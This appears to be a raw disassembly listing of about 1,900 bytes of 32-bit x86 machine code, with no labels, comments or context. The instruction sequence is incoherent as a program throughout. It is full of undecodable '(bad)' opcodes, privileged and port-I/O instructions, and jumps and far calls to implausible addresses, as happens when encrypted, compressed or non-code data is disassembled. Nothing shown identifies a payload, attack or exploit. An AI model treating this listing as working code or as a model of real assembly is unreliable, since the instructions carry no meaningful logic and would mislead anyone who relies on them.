  4098dc:	ficom  DWORD PTR [esi]
  4098de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098df:	sub    eax,0xb64e648e
  4098e4:	dec    edx
  4098e5:	mov    bh,BYTE PTR [bp+0x5383]
  4098ea:	dec    ebp
  4098eb:	(bad)  
  4098ec:	loopne 0x4098cf
  4098ee:	jns    0x4098d5
  4098f0:	or     eax,0x48b96d8e
  4098f5:	pop    edx
  4098f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098f7:	leave  
  4098f8:	pop    ds
  4098f9:	sub    ebp,DWORD PTR ds:0x93ab6642
  4098ff:	popa   
  409900:	iret   
  409901:	cmp    BYTE PTR [ecx-0x46],bh
  409904:	inc    eax
  409905:	ret    
  409906:	adc    ecx,DWORD PTR [ecx-0x80]
  409909:	dec    DWORD PTR [ecx+0x337e9376]
  40990f:	test   BYTE PTR [eax],0xba
  409912:	stos   BYTE PTR es:[edi],al
  409913:	bound  edi,QWORD PTR [edi]
  409915:	push   cs
  409916:	sub    al,0xf4
  409918:	push   edi
  409919:	push   esp
  40991a:	or     BYTE PTR [edx],cl
  40991c:	call   FWORD PTR [edx-0x1bdfd6d1]
  409922:	fsub   QWORD PTR [ecx]
  409924:	in     al,0x4b
  409926:	push   eax
  409927:	sbb    DWORD PTR [esi-0x3c],0x8a0f22
  40992e:	addr16 (bad) 
  409931:	mov    bl,0x83
  409933:	push   ds
  409934:	mov    bh,0x1a
  409936:	jecxz  0x40990e
  409938:	xchg   edx,eax
  409939:	sbb    edx,DWORD PTR [ebx+0x13]
  40993c:	loope  0x4099a5
  40993e:	mov    bl,BYTE PTR [edi-0x55]
  409941:	mov    gs,ebx
  409943:	(bad)  
  409944:	or     edx,DWORD PTR [edx]
  409946:	pop    ebp
  409947:	retf   0x71c0
  40994a:	outs   dx,DWORD PTR es:[esi]
  40994c:	jecxz  0x4098d7
  40994e:	xchg   esi,eax
  40994f:	sbb    al,0x86
  409951:	jecxz  0x4099ba
  409953:	scas   eax,DWORD PTR es:[edi]
  409954:	xlat   BYTE PTR ds:[ebx]
  409955:	dec    eax
  409956:	dec    ebx
  409957:	inc    ebx
  409958:	stos   DWORD PTR es:[edi],eax
  409959:	lods   al,BYTE PTR ds:[esi]
  40995a:	add    BYTE PTR [esp+ecx*4+0x10],al
  40995e:	aaa    
  40995f:	mov    ebx,0x7598279c
  409964:	test   al,0xac
  409966:	repnz lfs ebx,FWORD PTR [eax-0x13ea0cfd]
  40996e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40996f:	leave  
  409970:	in     eax,0x1b
  409972:	inc    ecx
  409973:	test   BYTE PTR [edx-0x6f],dl
  409976:	fwait
  409977:	inc    ebp
  409978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409979:	pop    ss
  40997a:	icebp  
  40997b:	mov    edx,0x24bf3298
  409980:	mov    bl,0x1b
  409982:	les    ecx,FWORD PTR [esp+ecx*2]
  409985:	dec    ebx
  409986:	xchg   DWORD PTR [ebx-0x8d2199f],edx
  40998c:	push   edx
  40998d:	lods   eax,DWORD PTR ds:[esi]
  40998e:	pusha  
  40998f:	into   
  409990:	xchg   DWORD PTR [esi-0x3f181689],ebp
  409996:	inc    esi
  409997:	jmp    0x70252188
  40999c:	ds pushf 
  40999e:	iret   
  40999f:	sub    dl,BYTE PTR [ecx+0x33]
  4099a2:	push   0x6f
  4099a4:	xor    eax,DWORD PTR [edx]
  4099a6:	popf   
  4099a7:	sbb    BYTE PTR [edi+ecx*4-0x27],dh
  4099ab:	out    0xfb,eax
  4099ad:	push   esi
  4099ae:	das    
  4099af:	mov    bh,0x1a
  4099b1:	push   ebp
  4099b2:	xor    eax,0xf301cfb0
  4099b7:	nop
  4099b8:	adc    BYTE PTR [esi],0x9a
  4099bb:	xchg   edx,eax
  4099bc:	mov    edi,DWORD PTR [edi-0x7a]
  4099bf:	mov    ds:0xda4e5bfb,eax
  4099c4:	pop    edi
  4099c5:	mov    esi,0xce34ce9b
  4099ca:	cmp    eax,0xda221b49
  4099cf:	test   DWORD PTR [ebx],esp
  4099d1:	bound  esi,QWORD PTR [ebx+edx*2-0x49c422a3]
  4099d8:	dec    edi
  4099d9:	jno    0x409a0e
  4099db:	(bad)  
  4099dc:	dec    DWORD PTR [ebp-0x3]
  4099df:	hlt    
  4099e0:	dec    ecx
  4099e1:	mov    fs,eax
  4099e3:	shr    BYTE PTR [edi],0x7e
  4099e6:	adc    eax,DWORD PTR ss:[ecx]
  4099e9:	loopne 0x40997e
  4099eb:	idiv   BYTE PTR ds:0x9713a69a
  4099f1:	xchg   eax,esp
  4099f3:	mov    eax,0x70c2819d
  4099f8:	dec    ecx
  4099f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099fa:	(bad)  
  4099fb:	loop   0x409a4a
  4099fd:	lods   al,BYTE PTR ds:[esi]
  4099fe:	dec    eax
  4099ff:	ror    ch,0x4a
  409a02:	xchg   ecx,eax
  409a03:	mov    eax,ds:0x8942cd37
  409a08:	add    ebx,DWORD PTR [ebx+0x4c]
  409a0b:	push   edx
  409a0c:	pusha  
  409a0d:	xor    eax,0x454c2532
  409a12:	xchg   ebx,eax
  409a13:	push   0x30f30bf2
  409a18:	inc    esi
  409a19:	mov    cl,BYTE PTR [esi+0x2]
  409a1c:	xor    DWORD PTR [eax+0x69],0xffffffac
  409a20:	scas   al,BYTE PTR es:[edi]
  409a21:	mov    dh,0x3a
  409a23:	fidiv  WORD PTR [edi-0x7b]
  409a26:	adc    al,0x2c
  409a28:	cwde   
  409a29:	cli    
  409a2a:	or     ebp,DWORD PTR [ecx-0x1b]
  409a2d:	mov    eax,ds:0xf811c5ca
  409a32:	inc    ebx
  409a33:	xlat   BYTE PTR ds:[ebx]
  409a34:	shl    dl,0x25
  409a37:	in     al,dx
  409a38:	ins    BYTE PTR es:[edi],dx
  409a39:	dec    edi
  409a3a:	jge    0x409a34
  409a3c:	mov    WORD PTR [edi-0x7031f065],cs
  409a42:	cld    
  409a43:	mov    ch,0xca
  409a45:	cmp    BYTE PTR [ecx+0x6ae919b1],ch
  409a4b:	adc    al,0x8f
  409a4d:	jge    0x409a3b
  409a4f:	and    esi,ebp
  409a51:	add    BYTE PTR [ecx],al
  409a53:	or     ah,BYTE PTR [ecx-0x1e]
  409a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a57:	out    0xb0,al
  409a59:	jg     0x4099f1
  409a5b:	loope  0x409a56
  409a5d:	cmp    dh,al
  409a5f:	inc    esi
  409a60:	push   esi
  409a61:	into   
  409a62:	or     al,dh
  409a64:	jp     0x4099f9
  409a66:	scas   al,BYTE PTR es:[edi]
  409a67:	inc    edi
  409a68:	pop    ebx
  409a69:	mov    BYTE PTR [ebx+0x3f367709],dh
  409a6f:	cmp    edx,DWORD PTR [eax]
  409a71:	inc    eax
  409a72:	je     0x409a66
  409a74:	sbb    dh,BYTE PTR [eax+0x42af22d7]
  409a7a:	mov    bl,0xd1
  409a7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a7d:	push   edi
  409a7e:	and    BYTE PTR [ebp+0x54],bl
  409a81:	xor    cl,BYTE PTR [ecx-0x407f0002]
  409a87:	pop    edx
  409a88:	clc    
  409a89:	ret    
  409a8a:	in     eax,0x16
  409a8c:	enter  0x19d7,0x64
  409a90:	bound  ebx,QWORD PTR [edi]
  409a92:	cdq    
  409a93:	jne    0x409a7a
  409a95:	xchg   esp,eax
  409a96:	sahf   
  409a97:	sti    
  409a98:	mov    esp,0x827ba250
  409a9d:	(bad)  
  409a9e:	lods   al,BYTE PTR ds:[esi]
  409a9f:	std    
  409aa0:	jmp    0xef861a9f
  409aa5:	sub    al,0x84
  409aa7:	or     DWORD PTR [ecx+0x3f],ecx
  409aaa:	hlt    
  409aab:	in     al,0x61
  409aad:	in     eax,dx
  409aae:	adc    cl,BYTE PTR [esi-0x5a]
  409ab1:	cli    
  409ab2:	stos   DWORD PTR es:[edi],eax
  409ab3:	aas    
  409ab4:	mov    cl,0x38
  409ab6:	or     ebp,eax
  409ab8:	lea    edi,[ebx-0x39]
  409abb:	mov    edx,0xa8b7ced1
  409ac0:	xchg   DWORD PTR [esi-0x4],esi
  409ac3:	adc    al,0x0
  409ac5:	jmp    0x409b3e
  409ac7:	xor    al,0x4c
  409ac9:	or     esi,DWORD PTR [ebx+ebx*1-0x5]
  409acd:	pop    ecx
  409ace:	inc    edx
  409acf:	popf   
  409ad0:	pusha  
  409ad1:	xor    ch,bh
  409ad3:	xor    DWORD PTR [eax],0xff76f550
  409ad9:	pop    esi
  409ada:	mov    cl,0x27
  409adc:	ret    
  409add:	sti    
  409ade:	sub    eax,0x62936a52
  409ae3:	inc    edx
  409ae4:	arpl   WORD PTR [esi+edi*8-0x9],si
  409ae8:	enter  0xa5bb,0xfe
  409aec:	mov    al,ds:0x3c776ae6
  409af1:	mov    eax,0x131a48c6
  409af6:	mov    ecx,0x3d875989
  409afb:	pop    esp
  409afc:	xchg   BYTE PTR [eax+0x51e062d],dl
  409b02:	adc    DWORD PTR [eax-0x50],esp
  409b05:	or     BYTE PTR [edi-0x30333fb9],cl
  409b0b:	jl     0x409ad4
  409b0d:	ss dec ebx
  409b0f:	cmp    BYTE PTR [ebx+0x1f],ch
  409b12:	pop    es
  409b13:	popa   
  409b14:	jecxz  0x409b53
  409b16:	sar    BYTE PTR [esi+0x5a078e7c],0xd3
  409b1d:	cmp    BYTE PTR [edi+0x15],dh
  409b20:	ficomp WORD PTR [bp+si]
  409b23:	sbb    edx,DWORD PTR [eax+0x46]
  409b26:	dec    ecx
  409b27:	mov    edx,0xb82f555d
  409b2c:	sbb    eax,0xddbbed01
  409b31:	mov    esp,DWORD PTR [ebx]
  409b33:	jb     0x409ac3
  409b35:	aas    
  409b36:	push   cs
  409b37:	and    DWORD PTR [ebx+eax*2],ecx
  409b3a:	fdiv   QWORD PTR [eax]
  409b3c:	in     eax,0x12
  409b3e:	pop    ecx
  409b3f:	aaa    
  409b40:	xor    bh,BYTE PTR [ebp+0x76bd6485]
  409b46:	(bad)  
  409b48:	cld    
  409b49:	lea    ebx,[edx+0x1d533491]
  409b4f:	and    DWORD PTR [ebx-0x498d7c71],esp
  409b55:	sub    DWORD PTR [ebx-0x3c12a8ab],0xfffffff6
  409b5c:	and    al,bl
  409b5e:	add    eax,0x3882ce85
  409b63:	inc    edx
  409b64:	fstp   DWORD PTR [edx-0x70]
  409b67:	xor    ebp,DWORD PTR [ebx+0x1d7ed065]
  409b6d:	mov    BYTE PTR [edx+0x3d896ee],dl
  409b73:	int    0xb2
  409b75:	push   esp
  409b76:	sub    eax,0x6f995163
  409b7b:	mov    edx,0x507958b1
  409b80:	sub    esp,DWORD PTR [ecx]
  409b82:	out    0x4,al
  409b84:	scas   al,BYTE PTR es:[edi]
  409b85:	pop    esi
  409b86:	nop
  409b87:	push   ecx
  409b88:	rol    DWORD PTR [ebx+esi*2-0x25],cl
  409b8c:	sub    BYTE PTR [edi+0xeb59d15],cl
  409b92:	addr16 xchg esp,eax
  409b94:	sbb    dh,BYTE PTR [edi-0x4d]
  409b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b98:	test   al,0x73
  409b9a:	sub    BYTE PTR [ebp+0x67],0xc5
  409b9e:	(bad)  
  409b9f:	fsubp  st(0),st
  409ba1:	popf   
  409ba2:	jb     0x409bee
  409ba4:	push   esi
  409ba5:	mov    ch,0xa4
  409ba7:	call   0xbfa7:0x5a7dab2b
  409bae:	or     edx,DWORD PTR [esi+0x36143b37]
  409bb4:	and    eax,0xe6937d24
  409bb9:	pop    ss
  409bba:	fistp  WORD PTR [ecx+0x566e8dba]
  409bc0:	sbb    DWORD PTR [esi-0x80],ecx
  409bc3:	sbb    al,0x3b
  409bc5:	xchg   BYTE PTR [esi],ah
  409bc7:	add    edi,DWORD PTR [ecx+0x541ca086]
  409bcd:	ja     0x409b78
  409bcf:	sub    ebp,edx
  409bd1:	shr    ch,cl
  409bd3:	rcl    al,0xe9
  409bd6:	and    al,0xcc
  409bd8:	lahf   
  409bd9:	leave  
  409bda:	jbe    0x409bfd
  409bdc:	leave  
  409bdd:	cwde   
  409bde:	test   eax,0xf91d7dca
  409be3:	(bad)  
  409be4:	xor    bl,bl
  409be6:	pop    es
  409be7:	add    BYTE PTR [eax+0x64e16892],ah
  409bed:	lods   eax,DWORD PTR ds:[esi]
  409bee:	test   BYTE PTR [ebp+0x60d97afa],al
  409bf4:	mov    eax,0xa308fc38
  409bf9:	call   0xb505b998
  409bfe:	ds mov edi,0xdb119426
  409c04:	pop    esi
  409c05:	ret    
  409c06:	and    BYTE PTR [esi+0x2f7905a7],bh
  409c0c:	das    
  409c0d:	add    BYTE PTR [ebp-0x65],bh
  409c10:	push   es
  409c11:	enter  0x9923,0x3
  409c15:	fld    DWORD PTR [ebx+eax*8]
  409c18:	inc    ebx
  409c19:	pushf  
  409c1a:	adc    edx,esp
  409c1c:	aad    0x56
  409c1e:	mov    esp,0xde4504f7
  409c23:	enter  0x26cd,0xf6
  409c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c28:	out    dx,eax
  409c29:	jmp    0x79a2:0x3e828db9
  409c30:	push   ebx
  409c31:	xor    al,0x42
  409c33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c34:	fs mov cl,0xd5
  409c37:	push   ss
  409c38:	dec    edx
  409c39:	pusha  
  409c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c3b:	adc    ah,BYTE PTR [eax-0x32]
  409c3e:	outs   dx,BYTE PTR ds:[esi]
  409c3f:	js     0x409c34
  409c41:	adc    al,BYTE PTR [esi-0x63]
  409c44:	mov    ah,BYTE PTR [edi-0x5707bfd1]
  409c4a:	in     al,dx
  409c4b:	(bad)  
  409c4c:	adc    DWORD PTR [ecx],ebx
  409c4e:	or     al,0x41
  409c50:	ss add eax,0x1f7875e1
  409c56:	out    dx,eax
  409c57:	jp     0x409c09
  409c59:	mov    cl,0xe7
  409c5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c5c:	mov    edx,0xf5aff866
  409c61:	dec    edx
  409c62:	cld    
  409c63:	loope  0x409bea
  409c65:	ret    0x998d
  409c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c69:	call   0x837ae53b
  409c6e:	cmp    esp,ebp
  409c70:	fld    TBYTE PTR [ecx+0x35]
  409c73:	lea    esi,[esi]
  409c75:	cmp    eax,0xb0052957
  409c7a:	sub    al,0x60
  409c7c:	cld    
  409c7d:	xchg   ebp,eax
  409c7e:	jmp    0x409c82
  409c80:	out    dx,eax
  409c81:	fsubr  DWORD PTR [esi-0x698056ed]
  409c87:	xchg   esi,eax
  409c88:	out    dx,eax
  409c89:	fwait
  409c8a:	aad    0x18
  409c8c:	or     eax,0x507ff02a
  409c91:	out    0x41,al
  409c93:	sub    al,0xe9
  409c95:	fcmovnb st,st(3)
  409c97:	in     al,dx
  409c98:	nop    DWORD PTR [edx-0x3ef9d1e4]
  409c9f:	stc    
  409ca0:	xor    BYTE PTR [edx+0x43],dh
  409ca3:	loope  0x409c80
  409ca5:	ins    DWORD PTR es:[edi],dx
  409ca6:	clc    
  409ca7:	aas    
  409ca8:	cmp    esp,eax
  409caa:	into   
  409cab:	popf   
  409cac:	cs cmp al,0x13
  409caf:	fs mov cl,0xb2
  409cb2:	or     ah,dh
  409cb4:	or     DWORD PTR [ecx+eiz*4-0x1],0xfffffff7
  409cb9:	mov    eax,0x1e0c1ffc
  409cbe:	sbb    DWORD PTR [esi+0x3e],eax
  409cc1:	shl    BYTE PTR [eax-0x75],1
  409cc4:	sub    al,0xbc
  409cc6:	daa    
  409cc7:	sti    
  409cc8:	adc    edx,0xa251b9e1
  409cce:	push   esp
  409ccf:	push   0x51
  409cd1:	mov    ds:0x711f07be,al
  409cd6:	push   ds
  409cd7:	xor    al,0x49
  409cd9:	shr    BYTE PTR [edi-0x2e],1
  409cdc:	mov    bl,0x35
  409cde:	push   edi
  409cdf:	xchg   BYTE PTR [eax-0x70],bl
  409ce2:	ins    DWORD PTR es:[edi],dx
  409ce3:	sub    BYTE PTR [eax+ecx*4+0x1d2249ac],bl
  409cea:	pop    ebx
  409ceb:	fcomp  QWORD PTR [ecx]
  409ced:	push   esp
  409cee:	mov    al,ds:0x207fb241
  409cf3:	test   BYTE PTR [edx+0x5f364d8b],bh
  409cf9:	add    ah,BYTE PTR fs:[esi+eax*1-0x6ca69b3c]
  409d01:	mov    WORD PTR [ecx+0x25],gs
  409d04:	push   esp
  409d05:	mov    cs,WORD PTR [edi]
  409d07:	sbb    eax,0xd1cd00d7
  409d0c:	add    edx,eax
  409d0e:	(bad)  
  409d0f:	ror    DWORD PTR ds:0x3519575c,1
  409d15:	das    
  409d16:	xor    ebp,edi
  409d18:	clc    
  409d19:	xchg   ebp,eax
  409d1a:	sub    ebx,DWORD PTR [edx*4+0x63710e3e]
  409d21:	mov    ebx,0x1a993398
  409d26:	clc    
  409d27:	js     0x409d7a
  409d29:	popa   
  409d2a:	sbb    al,0x55
  409d2c:	imul   edi,DWORD PTR [ebx+ebp*2+0x5d],0xb38fb6c2
  409d34:	pop    edx
  409d35:	push   cs
  409d36:	popf   
  409d37:	lods   al,BYTE PTR ds:[esi]
  409d38:	push   cs
  409d39:	mov    cl,0x46
  409d3b:	fs (bad) 
  409d3d:	jne    0x409cf7
  409d3f:	call   FWORD PTR [ecx-0x3e5d1891]
  409d45:	cmp    al,0x5c
  409d47:	ret    0x211e
  409d4a:	ror    BYTE PTR [esi-0x51f2688],1
  409d50:	sub    ch,bl
  409d52:	xchg   ecx,eax
  409d53:	mov    edi,0x5b0f5882
  409d58:	xchg   esp,eax
  409d59:	jmp    0xa290f21c
  409d5e:	pusha  
  409d5f:	sub    eax,DWORD PTR [ebp-0x31]
  409d62:	push   ebp
  409d63:	bound  ebx,QWORD PTR [ebp+0x64cb69f8]
  409d69:	inc    ebx
  409d6a:	es (bad) 
  409d6c:	mov    ebx,0x22338064
  409d71:	cmp    al,bl
  409d73:	push   es
  409d74:	in     al,dx
  409d75:	les    esi,FWORD PTR ds:0xfaaec3c
  409d7b:	mov    esp,0xd32b685b
  409d80:	pusha  
  409d81:	push   ebx
  409d82:	add    ch,BYTE PTR [esi+0x357b376c]
  409d88:	mov    al,0x66
  409d8a:	jmp    FWORD PTR [esi+0x5deab70f]
  409d90:	pushf  
  409d91:	out    dx,al
  409d92:	cwde   
  409d93:	(bad)  
  409d94:	jbe    0x409d98
  409d96:	mov    cl,0xdb
  409d98:	cmp    dh,BYTE PTR [ebx+0x3170c8]
  409d9e:	not    DWORD PTR [ebx-0x73a14e1]
  409da4:	fdivr  QWORD PTR [edi]
  409da6:	sbb    BYTE PTR [edx],bh
  409da8:	jns    0x409d46
  409daa:	xor    DWORD PTR [ecx-0x5a20754b],edi
  409db0:	jge    0x409d66
  409db2:	hlt    
  409db3:	jmp    0xa2549cc2
  409db8:	and    DWORD PTR [esi+ebp*8-0x2a],eax
  409dbc:	fs retf 
  409dbe:	and    al,0x2a
  409dc0:	shr    DWORD PTR [ebp-0x3a5e184f],1
  409dc6:	nop
  409dc7:	add    DWORD PTR [edx+0x74425069],eax
  409dcd:	enter  0xc466,0x45
  409dd1:	ret    
  409dd2:	rcl    DWORD PTR [esi+ebx*2],1
  409dd5:	div    esp
  409dd7:	cmp    ch,BYTE PTR [ebp-0x64]
  409dda:	mov    ecx,0xe5bdee7d
  409ddf:	pop    ebp
  409de0:	repnz adc dh,BYTE PTR [eax-0x115ac0bf]
  409de7:	addr16 pushf 
  409de9:	mov    esi,ds
  409deb:	popf   
  409dec:	sti    
  409ded:	(bad)  
  409dee:	sar    DWORD PTR [esi+eiz*4],1
  409df1:	cmc    
  409df2:	ds inc eax
  409df4:	xor    eax,0x18ad136d
  409df9:	push   ecx
  409dfa:	mov    eax,0x7466ab0f
  409dff:	jnp    0x9b7fd359
  409e05:	dec    esi
  409e06:	mov    ch,0x54
  409e08:	or     DWORD PTR [edx+0x5a],edi
  409e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e0c:	lahf   
  409e0d:	cmc    
  409e0e:	xchg   ebp,eax
  409e0f:	ret    
  409e10:	xchg   DWORD PTR [ebp+0x5b],edi
  409e13:	out    0x9e,eax
  409e15:	popa   
  409e16:	inc    esp
  409e17:	enter  0x8fd7,0x39
  409e1b:	mov    ds:0xdad50c3,al
  409e20:	xchg   edx,eax
  409e21:	and    al,ch
  409e23:	xchg   ebx,eax
  409e24:	outs   dx,BYTE PTR ds:[esi]
  409e25:	fsubr  DWORD PTR [eax-0x6fd6b478]
  409e2b:	das    
  409e2c:	xchg   edx,eax
  409e2d:	dec    edx
  409e2e:	pop    ebp
  409e2f:	mov    ds:0xf9dee226,eax
  409e34:	outs   dx,BYTE PTR ds:[esi]
  409e36:	pop    eax
  409e37:	sar    BYTE PTR [eax+0x67],1
  409e3a:	xchg   esi,eax
  409e3b:	loop   0x409e96
  409e3d:	jae    0x409ea1
  409e3f:	sbb    DWORD PTR [eax+0xaca9a71],esp
  409e45:	test   DWORD PTR [eax+0x44],edx
  409e48:	xor    BYTE PTR [edx+0x24778baf],ch
  409e4e:	mov    BYTE PTR [ebp+0x48c839f1],bl
  409e54:	or     esp,DWORD PTR [edx-0x1d]
  409e57:	rcr    BYTE PTR [eax],0x7e
  409e5a:	xor    bl,al
  409e5c:	sub    eax,0xd64bd656
  409e61:	lea    ecx,gs:[edx-0x3e]
  409e65:	cwde   
  409e66:	jle    0x409e02
  409e68:	fbld   TBYTE PTR [ebx+0x1a9aa03c]
  409e6e:	popf   
  409e6f:	lods   eax,DWORD PTR ds:[esi]
  409e70:	sub    eax,0xd878ed8e
  409e75:	sub    al,0x6c
  409e77:	aam    0x29
  409e79:	aas    
  409e7a:	cmp    BYTE PTR [ecx+0x147f75a9],0x6
  409e81:	pop    edx
  409e82:	mov    DWORD PTR [esi+0x43],edx
  409e85:	scas   al,BYTE PTR es:[edi]
  409e86:	sbb    al,0xe2
  409e88:	jmp    0x456595ce
  409e8d:	aaa    
  409e8e:	pop    esi
  409e8f:	sbb    eax,0x662bcbe2
  409e94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e95:	adc    al,0x9b
  409e97:	mov    al,0x9
  409e99:	popf   
  409e9a:	mov    bh,0xa4
  409e9c:	fcom   DWORD PTR [esi-0x5cd93132]
  409ea2:	scas   eax,DWORD PTR es:[edi]
  409ea3:	cmp    DWORD PTR [ebx],esi
  409ea5:	ins    BYTE PTR es:[edi],dx
  409ea6:	js     0x409ed0
  409ea8:	pop    ecx
  409ea9:	mov    al,0xe7
  409eab:	outs   dx,BYTE PTR ds:[esi]
  409eac:	cdq    
  409ead:	cli    
  409eae:	ret    0x6913
  409eb1:	mov    ah,cl
  409eb3:	inc    esi
  409eb4:	mov    DWORD PTR [ebp+0x4d219f35],esp
  409eba:	fistp  QWORD PTR [ecx-0x6f]
  409ebd:	mov    bl,0x0
  409ebf:	fmul   st(5),st
  409ec1:	retf   0x4766
  409ec4:	mov    ebx,0xf3084872
  409ec9:	inc    esi
  409eca:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  409ecc:	repnz xor ebx,DWORD PTR [edi+0x57]
  409ed0:	xchg   edx,eax
  409ed1:	push   cs
  409ed2:	repz repz mov eax,DWORD PTR cs:[ebp+0x721ffd64]
  409edb:	aaa    
  409edc:	xchg   edx,eax
  409edd:	gs jmp 0x409ed0
  409ee0:	popa   
  409ee1:	jmp    0x9a57fd36
  409ee6:	rol    DWORD PTR [ecx],0xca
  409ee9:	test   DWORD PTR [ebx-0x527cadf4],edi
  409eef:	mov    ds:0xd4361bf0,al
  409ef4:	ja     0x409eaa
  409ef6:	daa    
  409ef7:	mov    ebx,0x1950ab85
  409efc:	xlat   BYTE PTR ds:[ebx]
  409efd:	das    
  409efe:	fs push ebp
  409f00:	(bad)  
  409f01:	dec    esi
  409f02:	repnz lock popf 
  409f05:	mov    al,ds:0x3befc60a
  409f0a:	and    ebx,DWORD PTR [ebx+0x27]
  409f0d:	mov    esi,0x96e1aeef
  409f12:	fild   WORD PTR [ebx-0x4d]
  409f15:	ds inc eax
  409f17:	xor    eax,0x7f19a7c2
  409f1c:	test   BYTE PTR [ebx],dl
  409f1e:	sbb    edx,DWORD PTR [eax+0x29]
  409f21:	xor    al,0x13
  409f23:	mov    edi,0xec8495b5
  409f28:	dec    esi
  409f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f2a:	fs mov ecx,0xa3668ee5
  409f30:	cmp    eax,0xe5d4aa79
  409f35:	mov    BYTE PTR [esi-0x79],dl
  409f38:	mov    ebx,0x33e92e89
  409f3d:	inc    edi
  409f3e:	mov    bh,0x1a
  409f40:	xor    DWORD PTR [ebp+0x408e541a],eax
  409f46:	ins    DWORD PTR es:[edi],dx
  409f47:	sbb    BYTE PTR [esi+eax*2],dh
  409f4a:	arpl   WORD PTR [esi+0x33],bx
  409f4d:	or     eax,0xb61d7da4
  409f52:	inc    esi
  409f53:	(bad)  
  409f55:	rdmsr  
  409f57:	dec    edx
  409f58:	fldl2t 
  409f5a:	push   ss
  409f5b:	iret   
  409f5c:	out    0x34,eax
  409f5e:	jp     0x409fb2
  409f60:	and    dl,BYTE PTR [edx-0xcb184dc]
  409f66:	test   al,0x8c
  409f68:	cmp    al,0xa8
  409f6a:	bound  esi,QWORD PTR [esi]
  409f6c:	lock and eax,0xb519c675
  409f72:	(bad)  
  409f74:	stos   BYTE PTR es:[edi],al
  409f75:	lock popa 
  409f77:	jp     0x409f14
  409f79:	(bad)  
  409f7a:	popa   
  409f7b:	mov    ah,0x2a
  409f7d:	lods   al,BYTE PTR ds:[esi]
  409f7e:	and    eax,0x6bc96c33
  409f83:	jp     0x409fed
  409f85:	mov    esp,0xff3b51dc
  409f8a:	adc    eax,0xe3b8c55
  409f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f90:	lods   al,BYTE PTR ds:[esi]
  409f91:	or     ah,BYTE PTR [edx-0x7e29159b]
  409f97:	rol    BYTE PTR [edi+0x2b7db5d0],cl
  409f9d:	inc    esi
  409f9e:	pop    ds
  409f9f:	fiadd  WORD PTR [edi]
  409fa1:	push   ebx
  409fa2:	adc    esp,DWORD PTR [eax-0x5b]
  409fa5:	pushf  
  409fa6:	mov    dh,0x3d
  409fa8:	add    edi,edx
  409faa:	xor    DWORD PTR [esi-0x61],ebx
  409fad:	leave  
  409fae:	pop    edx
  409faf:	cmp    al,0xb3
  409fb1:	iret   
  409fb2:	or     DWORD PTR [esi-0x44],edi
  409fb5:	xchg   ebp,eax
  409fb6:	jmp    0x409f3a
  409fb8:	js     0x409fee
  409fba:	jno    0x40a021
  409fbc:	sub    al,dl
  409fbe:	xor    BYTE PTR [eax],al
  409fc0:	and    edx,ebp
  409fc2:	int    0x7
  409fc4:	out    dx,eax
  409fc5:	mov    BYTE PTR [eax-0x1a63f727],ah
  409fcb:	jne    0x409ff3
  409fcd:	retf   
  409fce:	test   BYTE PTR [ebp-0x43],bl
  409fd1:	mov    dl,0x4d
  409fd3:	xchg   ebx,eax
  409fd4:	cmc    
  409fd5:	fcomip st,st(1)
  409fd7:	mov    dl,0x6d
  409fd9:	loope  0x409f6a
  409fdb:	sbb    eax,0xaf265893
  409fe0:	inc    ebp
  409fe1:	retf   0x82aa
  409fe4:	into   
  409fe5:	sahf   
  409fe6:	jno    0x409feb
  409fe8:	xchg   esi,eax
  409fe9:	jae    0x409fa4
  409feb:	dec    ebx
  409fec:	lahf   
  409fed:	(bad)  
  409fee:	or     BYTE PTR [edx-0x78],bh
  409ff1:	adc    DWORD PTR [ebx-0x32],ebp
  409ff4:	jmp    0xc391c156
  409ff9:	sbb    BYTE PTR [edx],al
  409ffb:	push   ds
  409ffc:	cld    
  409ffd:	out    0x59,eax
  409fff:	sbb    BYTE PTR [edi],ah
  40a001:	mov    eax,0xdf2d8bad
  40a006:	(bad)  
  40a007:	aad    0x6d
  40a009:	fidivr DWORD PTR [eax]
  40a00b:	fsub   st(1),st
  40a00d:	sbb    esi,edx
  40a00f:	inc    edx
  40a010:	push   edi
  40a011:	inc    ebx
  40a012:	add    ebx,DWORD PTR [esi-0x5b7e5e82]
  40a018:	shl    DWORD PTR ss:[ebx],1
  40a01b:	mov    ch,0x89
  40a01d:	jne    0x40a020
  40a01f:	dec    ebp
  40a020:	jmp    0x40a090
  40a022:	add    ebp,DWORD PTR [edi]
  40a024:	test   eax,0x6b92fce1
  40a029:	and    DWORD PTR [edi+0x66],esi
  40a02c:	push   ds
  40a02d:	call   0xd590:0x36abe6e8
  40a034:	bound  edi,QWORD PTR [eax]
  40a036:	or     DWORD PTR [esi-0x7e],ecx
  40a039:	pop    esp
  40a03a:	(bad)  
  40a03b:	cld    
  40a03c:	jno    0x40a006
  40a03e:	dec    ecx
  40a03f:	sbb    al,0x9a
  40a041:	jb     0x40a011
  40a043:	dec    ebx
  40a044:	jmp    0x40a021
  40a046:	loop   0x40a039
  40a048:	in     eax,0x64
  40a04a:	(bad)  
  40a04b:	stos   BYTE PTR es:[edi],al
  40a04c:	ret    0xc6ce
  40a04f:	cmp    ch,BYTE PTR [eax+0x18]
  40a052:	sbb    bl,BYTE PTR [ebp-0x7c]
  40a055:	jnp    0x40a069
  40a057:	push   ebp
  40a058:	retf   
  40a059:	pushf  
  40a05a:	mov    dl,0xe5
  40a05c:	rcr    BYTE PTR [esi+0x17],cl
  40a05f:	pop    ebp
  40a060:	loop   0x40a026
